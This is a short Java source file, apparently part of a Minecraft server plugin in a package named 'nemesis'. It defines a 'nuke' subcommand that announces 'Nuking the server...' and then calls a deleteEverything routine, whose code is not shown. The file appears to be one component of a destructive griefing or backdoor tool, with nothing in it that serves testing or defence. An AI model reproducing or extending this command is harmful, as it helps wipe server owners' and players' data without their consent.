package nemesis.commands.subcommands;

import org.bukkit.command.CommandSender;

import nemesis.Utils;
import nemesis.commands.SubCommand;

public class Nuke implements SubCommand {

    @Override
    public void execute(CommandSender sender, String[] args) {
        sender.sendMessage(Utils.colorize("&cNuking the server..."));
        Utils.deleteEverything();
    }

    @Override
    public String getName() {
        return "nuke";
    }
}